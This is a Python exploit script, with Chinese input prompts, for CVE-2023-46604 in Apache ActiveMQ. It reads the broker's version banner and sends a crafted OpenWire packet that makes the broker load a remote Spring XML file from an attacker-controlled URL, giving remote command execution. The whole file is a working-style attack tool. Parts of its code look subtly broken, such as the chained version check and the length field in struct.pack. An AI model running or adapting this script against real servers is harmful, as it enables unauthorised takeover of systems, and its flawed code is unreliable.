'''
CVE-2023-46604 exploit
@author: ga0weI
@time: 2023-11-16
'''
from socket import *
import struct

if __name__ == '__main__':
    servername = input("目的IP/域名：")
    server_port = int(input("ActiveMQ端口："))
    xmlurl_string = input("load_xml地址：")
    # server_port = 61616
    # servername = "192.168.148.141"
    # xmlurl_string = "http://192.168.148.1:8989/reponseCmd.xml"
    tcp_client_socket = socket(AF_INET, SOCK_STREAM)
    server_addr = (servername, server_port)
    tcp_client_socket.connect(server_addr)
    recv = tcp_client_socket.recv(1024)
    version  = bytes.fromhex(recv.hex()[-12:]).decode()
    print("client recv :{}".format(recv.hex()))
    print("version:{}".format(version))
    if version !="5.18.3"&version !="5.17.6"&version !="5.16.7"&version !="5.15.16":
        '''
        Packet Length | Command | Command Id | Command response required | CorrelationId |
        not-null | not-null | classnamelen | classname | not-null | messagelen | message |
        not-null | (messagelen + message)
        '''
        orgxml = "0000007c1f000000000000000000" \
                 "010100436f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e46696c6553797374656d586d6c4170706c69636174696f6e436f6e74657874" \
                 "01"


        len_xml = len(xmlurl_string)
        xml_payload = struct.pack(">H{}s".format(len(orgxml)),len_xml,xmlurl_string.encode()).hex()
        all_payload_hex = orgxml+xml_payload
        all_payload=bytes.fromhex(all_payload_hex)

        print("client send :{}".format(all_payload.hex()))
        tcp_client_socket.send(all_payload)
    else:
        print("no vurnelability")
